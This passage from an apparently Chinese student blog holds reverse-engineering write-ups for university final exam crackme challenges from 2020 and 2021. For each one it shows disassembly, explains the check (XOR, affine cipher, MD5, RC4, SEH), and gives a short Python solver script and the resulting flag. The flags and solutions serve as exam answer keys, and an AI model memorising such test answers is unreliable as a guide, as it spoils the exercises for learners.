class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_14]</span><br><span class="line">movsx   eax, byte_42CD78[edx]</span><br><span class="line">cmp     eax, 61h</span><br><span class="line">jl      short loc_4013A4</span><br><span class="line">mov     ecx, [ebp+var_14]</span><br><span class="line">movsx   edx, byte_42CD78[ecx]</span><br><span class="line">cmp     edx, 7Ah</span><br><span class="line">jg      short loc_4013A4</span><br><span class="line">mov     [ebp+var_18], 61h</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">movsx   ecx, byte_42CD78[eax]</span><br><span class="line">sub     ecx, [ebp+var_18]</span><br><span class="line">mov     [ebp+var_1C], ecx</span><br><span class="line">mov     eax, [ebp+var_1C]</span><br><span class="line">imul    eax, [ebp+var_4]</span><br><span class="line">add     eax, [ebp+var_8]</span><br><span class="line">cdq</span><br><span class="line">mov     ecx, 1Ah</span><br><span class="line">idiv    ecx</span><br><span class="line">mov     [ebp+var_1C], edx</span><br><span class="line">mov     edx, [ebp+var_1C]</span><br><span class="line">add     edx, [ebp+var_18]</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">mov     byte_42CD78[eax], dl</span><br><span class="line">loc_4013A4:</span><br><span class="line">mov     ecx, [ebp+var_14]</span><br><span class="line">movsx   edx, byte_42CD78[ecx]</span><br><span class="line">cmp     edx, 41h</span><br><span class="line">jl      short loc_4013FD</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">movsx   ecx, byte_42CD78[eax]</span><br><span class="line">cmp     ecx, 5Ah</span><br><span class="line">jg      short loc_4013FD</span><br><span class="line">mov     [ebp+var_18], 41h</span><br><span class="line">mov     edx, [ebp+var_14]</span><br><span class="line">movsx   eax, byte_42CD78[edx]</span><br><span class="line">sub     eax, [ebp+var_18]</span><br><span class="line">mov     [ebp+var_1C], eax</span><br><span class="line">mov     eax, [ebp+var_1C]</span><br><span class="line">imul    eax, [ebp+var_4]</span><br><span class="line">add     eax, [ebp+var_8]</span><br><span class="line">cdq</span><br><span class="line">mov     ecx, 1Ah</span><br><span class="line">idiv    ecx</span><br><span class="line">mov     [ebp+var_1C], edx</span><br><span class="line">mov     edx, [ebp+var_1C]</span><br><span class="line">add     edx, [ebp+var_18]</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">mov     byte_42CD78[eax], dl</span><br></pre></td></tr></table></figure><p>异常处理函数内部逻辑比较简单，就是对我们输入的字符串中的字母应用仿射加密，其中乘数（var_4）为3，var_8为7。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_8]</span><br><span class="line">movsx   eax, byte_42CD78[edx]</span><br><span class="line">mov     ecx, [ebp+var_8]</span><br><span class="line">cmp     eax, dword_429A44[ecx*4]</span><br><span class="line">jz      short loc_4012AA</span><br></pre></td></tr></table></figure><p>与429A44处进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">429A44处字符串为wohz&#123;M1hu-71-4h0-9t-h-!&#125;</span><br></pre></td></tr></table></figure><p>解密得flag为<code>flag&#123;T1an-71-4a0-9e-a-!&#125;</code>。</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021逆向期末试题</title>
      <link href="/2022/07/re2021/"/>
      <url>/2022/07/re2021/</url>
      
        <content type="html"><![CDATA[<p>这课真的不是密码学吗？</p><p>链接：<a href="https://pan.baidu.com/s/1hT5ineHI-EAfWPUF6AHoyA?pwd=glqk">https://pan.baidu.com/s/1hT5ineHI-EAfWPUF6AHoyA?pwd=glqk</a><br>提取码：glqk</p><h2 id="cpp-1">cpp.1</h2><p>看到VirtualProtect，一眼hook，不过这题跟hook没有太大关系。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">00401118  mov     byte ptr [ebp-1C], 1A</span><br><span class="line">0040111C  mov     byte ptr [ebp-1B], 0A</span><br><span class="line">00401120  mov     byte ptr [ebp-1A], 0E</span><br><span class="line">00401124  mov     byte ptr [ebp-19], 7</span><br><span class="line">00401128  mov     byte ptr [ebp-18], 11</span><br><span class="line">0040112C  mov     byte ptr [ebp-17], 7</span><br><span class="line">00401130  mov     byte ptr [ebp-16], 0D</span><br><span class="line">00401134  mov     byte ptr [ebp-15], 0</span><br><span class="line">00401138  mov     dword ptr [ebp-20], 0</span><br><span class="line">0040113F  call    00401005</span><br><span class="line">00401144  push    0042803C        ;  ASCII &quot;Please input your flag &quot;</span><br><span class="line">00401149  call    004019C0</span><br><span class="line">0040114E  add     esp, 4</span><br><span class="line">00401151  lea     eax, dword ptr [ebp-14]</span><br><span class="line">00401154  push    eax</span><br><span class="line">00401155  push    00428038        ;  ASCII &quot;%s&quot;</span><br><span class="line">0040115A  call    00401960</span><br><span class="line">0040115F  add     esp, 8</span><br><span class="line">00401162  mov     dword ptr [ebp-20], 0</span><br><span class="line">00401169  jmp     short 00401174</span><br><span class="line">0040116B  mov     ecx, dword ptr [ebp-20]</span><br><span class="line">0040116E  add     ecx, 1</span><br><span class="line">00401171  mov     dword ptr [ebp-20], ecx</span><br><span class="line">00401174  cmp     dword ptr [ebp-20], 7</span><br><span class="line">00401178  jge     short 00401195</span><br><span class="line">0040117A  mov     edx, dword ptr [ebp-20]</span><br><span class="line">0040117D  movsx   eax, byte ptr [ebp+edx-14]</span><br><span class="line">00401182  mov     ecx, dword ptr [ebp-20]</span><br><span class="line">00401185  movsx   edx, byte ptr [ebp+ecx-1C]</span><br><span class="line">0040118A  xor     eax, edx</span><br><span class="line">0040118C  mov     ecx, dword ptr [ebp-20]</span><br><span class="line">0040118F  mov     byte ptr [ebp+ecx-1C], al</span><br><span class="line">00401193  jmp     short 0040116B</span><br></pre></td></tr></table></figure><p>分析可得输入字符串与一个字符串进行异或，再与以下字符串进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串为0x72,0x65,0x61,0x6C,0x70,0x77,0x64</span><br></pre></td></tr></table></figure><p>求解脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x61</span>,<span class="number">0x6C</span>,<span class="number">0x70</span>,<span class="number">0x77</span>,<span class="number">0x64</span>]</span><br><span class="line">b = [<span class="number">0x1A</span>,<span class="number">0x0A</span>,<span class="number">0x0E</span>,<span class="number">0x7</span>,<span class="number">0x11</span>,<span class="number">0x7</span>,<span class="number">0xD</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">c.append(<span class="built_in">chr</span>(a[i]^b[i]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><p>flag为<code>hookapi</code>。</p><h2 id="cpp-2">cpp.2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_1C]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_1C]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+strlen], eax</span><br><span class="line">cmp     [ebp+strlen], 7</span><br><span class="line">jz      short loc_4010BC</span><br></pre></td></tr></table></figure><p>要求输入为7个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_1C]</span><br><span class="line">and     edx, 3Ch</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_1C]</span><br><span class="line">and     ecx, 0C0h</span><br><span class="line">sar     ecx, 6</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_1C]</span><br><span class="line">and     ecx, 3</span><br><span class="line">shl     ecx, 6</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">xor     edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_1C], d</span><br></pre></td></tr></table></figure><p>主要逻辑是将var_14的每一字符的高两位和低两位对调，即若原字符为x<sub>7</sub>x<sub>6</sub>x<sub>5</sub>x<sub>4</sub>x<sub>3</sub>x<sub>2</sub>x<sub>1</sub>x<sub>0</sub><br>则现在的字符为x<sub>1</sub>x<sub>0</sub>x<sub>5</sub>x<sub>4</sub>x<sub>3</sub>x<sub>2</sub>x<sub>7</sub>x<sub>6</sub>，再与存于var_14处的字符串进行异或。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_1C]</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">movsx   eax, [ebp+edx+var_C]</span><br><span class="line">cmp     ecx, eax</span><br><span class="line">jz      short loc_401147</span><br></pre></td></tr></table></figure><p>最后与var_C处字符串进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov     [ebp+var_C], 83h</span><br><span class="line">mov     [ebp+var_B], 55h</span><br><span class="line">mov     [ebp+var_A], 13h</span><br><span class="line">mov     [ebp+var_9], 14h</span><br><span class="line">mov     [ebp+var_8], 83h</span><br><span class="line">mov     [ebp+var_7], 88h</span><br><span class="line">mov     [ebp+var_6], 0C7h</span><br><span class="line">mov     [ebp+var_5], 0</span><br><span class="line">mov     [ebp+var_14], 2</span><br><span class="line">mov     [ebp+var_13], 0</span><br><span class="line">mov     [ebp+var_12], 2</span><br><span class="line">mov     [ebp+var_11], 1</span><br><span class="line">mov     [ebp+var_10], 6</span><br><span class="line">mov     [ebp+var_F], 1</span><br><span class="line">mov     [ebp+var_E], 16h</span><br></pre></td></tr></table></figure><p>var_14和var_C开始的7个字节的值如上。<br>求解脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x2</span>,<span class="number">0x0</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x6</span>,<span class="number">0x1</span>,<span class="number">0x16</span>]</span><br><span class="line">b = [<span class="number">0x83</span>,<span class="number">0x55</span>,<span class="number">0x13</span>,<span class="number">0x14</span>,<span class="number">0x83</span>,<span class="number">0x88</span>,<span class="number">0x0C7</span>]</span><br><span class="line">c = []</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">d = a[i]^b[i]</span><br><span class="line">d = ((d&amp;<span class="number">0xC0</span>)&gt;&gt;<span class="number">6</span>) | (d&amp;<span class="number">0x3C</span>) | ((d&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">6</span>)</span><br><span class="line">c.append(<span class="built_in">chr</span>(d))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><p>得到flag为<code>BUPTFJS</code>。</p><h2 id="cpp-3">cpp.3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00401096   mov     ecx, dword ptr [ebp-78]</span><br><span class="line">00401099   movsx   edx, byte ptr [ebp+ecx-6C]</span><br><span class="line">0040109E   cmp     edx, 61</span><br><span class="line">004010A1   jl      short 004010B0</span><br><span class="line">004010A3   mov     eax, dword ptr [ebp-78]</span><br><span class="line">004010A6   movsx   ecx, byte ptr [ebp+eax-6C]</span><br><span class="line">004010AB   cmp     ecx, 7A</span><br></pre></td></tr></table></figure><p>要求输入范围为a-z。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">004010D9   mov     ecx, dword ptr [ebp-78]</span><br><span class="line">004010DC   movsx   edx, byte ptr [ebp+ecx-6C]</span><br><span class="line">004010E1   sub     edx, 61</span><br><span class="line">004010E4   mov     dword ptr [ebp-70], edx</span><br><span class="line">004010E7   mov     eax, dword ptr [ebp-70]</span><br><span class="line">004010EA   imul    eax, dword ptr [ebp-4]</span><br><span class="line">004010EE   add     eax, dword ptr [ebp-8]</span><br><span class="line">004010F1   cdq</span><br><span class="line">004010F2   mov     ecx, 1A</span><br><span class="line">004010F7   idiv    ecx</span><br><span class="line">004010F9   mov     dword ptr [ebp-70], edx</span><br><span class="line">004010FC   mov     edx, dword ptr [ebp-70]</span><br><span class="line">004010FF   add     edx, 61</span><br></pre></td></tr></table></figure><p>是仿射加密，var_4和var_8的值均为5。<br>加密后得到的字符串与字符串<code>jmzfwgfibz</code>作比较。<br>可以求得flag为<code>greatvalue</code>。</p><h2 id="cpp-4">cpp.4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_434]</span><br><span class="line">movsx   eax, [ebp+edx+var_424]</span><br><span class="line">cmp     eax, 30h</span><br><span class="line">jl      short loc_402245</span><br><span class="line">mov     ecx, [ebp+var_434]</span><br><span class="line">movsx   edx, [ebp+ecx+var_424]</span><br><span class="line">cmp     edx, 39h</span><br><span class="line">jle     short loc_40224D</span><br></pre></td></tr></table></figure><p>要求输入范围为0-9。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmp     [ebp+var_430], 5</span><br><span class="line">jnb     short loc_402267</span><br><span class="line">push    4               ; int</span><br><span class="line">lea     edx, [ebp+var_42C]</span><br><span class="line">push    edx             ; int</span><br><span class="line">lea     eax, [ebp+var_24]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    sub_401014</span><br></pre></td></tr></table></figure><p>可知输入长度要求为5个字符。同时根据对后面的分析，只对前4个字符进行处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0042805C dword_42805C    dd 0D76AA478h</span><br><span class="line">.rdata:00428060 dword_428060    dd 0E8C7B756h</span><br><span class="line">.rdata:00428064 dword_428064    dd 242070DBh</span><br><span class="line">.rdata:00428068 dword_428068    dd 0C1BDCEEEh</span><br></pre></td></tr></table></figure><p>是MD5，加密后的字符串与字符串<code>eb62f6b9306db575c2d596b1279627a4</code>做比较。求得对应明文为<code>0123</code>，需要在后面再添加一个数字。</p><h2 id="cpp-5">cpp.5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_CC]</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">mov     cl, byte ptr [ebp+eax+var_C8]</span><br><span class="line">mov     edx, [ebp+var_CC]</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     al, byte_429B30[edx]</span><br><span class="line">cmp     ecx, eax</span><br><span class="line">jz      short loc_401113</span><br></pre></td></tr></table></figure><p>本题要求var_C8处字符串与byte_429B30字符串进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">mov     esi, [ebp+var_8]</span><br><span class="line">add     esi, dword_42CE3C[ecx*4]</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">cdq</span><br><span class="line">idiv    [ebp+var_C]</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     al, byte ptr aSecrets[edx] ; &quot;secrets&quot;</span><br><span class="line">add     esi, eax</span><br><span class="line">and     esi, 800000FFh</span><br><span class="line">jns     short loc_401232</span><br><span class="line">loc_401232:</span><br><span class="line">mov     [ebp+var_8], esi</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">mov     dl, byte ptr dword_42CE3C[ecx*4]</span><br><span class="line">mov     byte ptr [ebp+var_10], dl</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     ecx, [ebp+var_8]</span><br><span class="line">mov     edx, dword_42CE3C[ecx*4]</span><br><span class="line">mov     dword_42CE3C[eax*4], edx</span><br><span class="line">mov     eax, [ebp+var_10]</span><br><span class="line">and     eax, 0FFh</span><br><span class="line">mov     ecx, [ebp+var_8]</span><br><span class="line">mov     dword_42CE3C[ecx*4], eax</span><br><span class="line">jmp     short loc_4011F2</span><br></pre></td></tr></table></figure><p>根据上述算法进行推断为RC4算法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始密钥为secrets。</span><br><span class="line">byte_429B30为0x10,0x2C,0x2,0x0FC,0x0FB,0x3B,0x0D,0x73,0x6E,0x0BC,0x0B9,0x0A7,0x6F,0x2F.</span><br></pre></td></tr></table></figure><p>根据下面的代码可知，是先将密钥流取反，再与输入的字符串进行异或。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and     eax, 0FFh</span><br><span class="line">not     eax</span><br><span class="line">xor     ebx, eax</span><br></pre></td></tr></table></figure><p>所以可以等价为先对<code>byte_429B30</code>取反，再与密钥流进行异或。<br>可以求得flag为<code>seeyounextyear</code>。（感觉这个flag不是很友善）</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020逆向期末试题</title>
      <link href="/2022/07/re2020/"/>
      <url>/2022/07/re2020/</url>
      
        <content type="html"><![CDATA[<p>考试时间很紧，还需要写过程，肯定是没空慢慢分析的，所以需要带🔥对常用的算法或知识点比较熟悉。一般涉及内容为加解密算法逆向、SEH、hook、花指令。</p><p>加解密算法的关键是了解加解密算法的一些特征（如DES的S-box，RC4的循环次数），算法的部分特征参数可以成为确定算法的关键。了解算法，调试好解密程序，基本没有什么问题。值得注意的是题目可能会在一些地方动手脚，一般会在明文、密文或密钥上面动手脚，如替换某些字符，字符串整体加1等。也有可能会采取组合加密的方式，不过目前没遇到过。基本不可能在算法上面做文章，因为这意味着需要修改解密脚本，比较费时（两个小时，想peach，这么干估计挂科的人得增加一半）。</p><p>题目：<br>链接：<a href="https://pan.baidu.com/s/19lSS-Z6NcW9Bef5bOJ_aHg?pwd=3bmr">https://pan.baidu.com/s/19lSS-Z6NcW9Bef5bOJ_aHg?pwd=3bmr</a><br>提取码：3bmr</p><h2 id="cpp-1">cpp.1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_18]</span><br><span class="line">push    eax</span><br><span class="line">call    sub_401005      ; scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_18]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_30], eax</span><br><span class="line">cmp     [ebp+var_30], 0Fh</span><br><span class="line">jz      short loc_401179</span><br></pre></td></tr></table></figure><p>要求输入的字符串长度为15个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_18]        ; var_18为我们输入的字符串</span><br><span class="line">mov     eax, [ebp+var_30]            ; var_30为我们输入字符串的长度</span><br><span class="line">sub     eax, 1</span><br><span class="line">sub     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, byte_427A30[eax]</span><br><span class="line">xor     edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_2C], dl</span><br></pre></td></tr></table></figure><p>主要逻辑是取出427A30处字符串的一个字符，取出字符的索引为var_30-1-var_4，若将var_4重命名为i，var_30正常情况下为15，则索引值为14-i，即将427A30处字符串反序取出，并于var_18进行异或，结果存于var_2C中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_2C]</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">movsx   eax, byte_427A40[edx]</span><br><span class="line">cmp     ecx, eax</span><br></pre></td></tr></table></figure><p>最终所得结果与427A40处字符串进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">427A30处字符串反序为0xF,0xE,0xD,0xC,0xB,0xA,9,8,7,6,5,4,3,2,1</span><br><span class="line">427A40处字符串为42h,61h,7Fh,69h,5Fh,62h,6Ch,66h,41h,74h,6Ch,61h,6Dh,66h,72h</span><br></pre></td></tr></table></figure><p>所以我们只需将427A40处字符串与427A30处字符串反序进行异或即可求解出结果。<br>求解脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x42</span>,<span class="number">0x61</span>,<span class="number">0x7F</span>,<span class="number">0x69</span>,<span class="number">0x5F</span>,<span class="number">0x62</span>,<span class="number">0x6C</span>,<span class="number">0x66</span>,<span class="number">0x41</span>,<span class="number">0x74</span>,<span class="number">0x6C</span>,<span class="number">0x61</span>,<span class="number">0x6D</span>,<span class="number">0x66</span>,<span class="number">0x72</span>]</span><br><span class="line">b = [<span class="number">0xF</span>,<span class="number">0xE</span>,<span class="number">0xD</span>,<span class="number">0xC</span>,<span class="number">0xB</span>,<span class="number">0xA</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">d = a[i] ^ b[i]</span><br><span class="line">d = <span class="built_in">chr</span>(d)</span><br><span class="line">c += d</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><p>求得flag为“MoreThenFriends”。</p><h2 id="cpp-2">cpp.2</h2><p>使用IDA进行分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_28]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_28]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_2C], eax</span><br><span class="line">cmp     [ebp+var_2C], 12h</span><br><span class="line">jz      short loc_4011A3</span><br></pre></td></tr></table></figure><p>易知要求我们输入长度为18个字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push    10h</span><br><span class="line">lea     edx, [ebp+var_28]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">push    offset byte_42CC9C ; char *</span><br><span class="line">call    _strncpy</span><br></pre></td></tr></table></figure><p>将我们输入的前16个字节的内容拷贝到0x42CC9C处。<br>再由<code>mov [ebp+var_8], 0</code>和<code>idiv [ebp+var_8]</code>可知，除数为0，程序发生异常。<br>再使用od进行分析，可以得到程序的异常处理函数的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 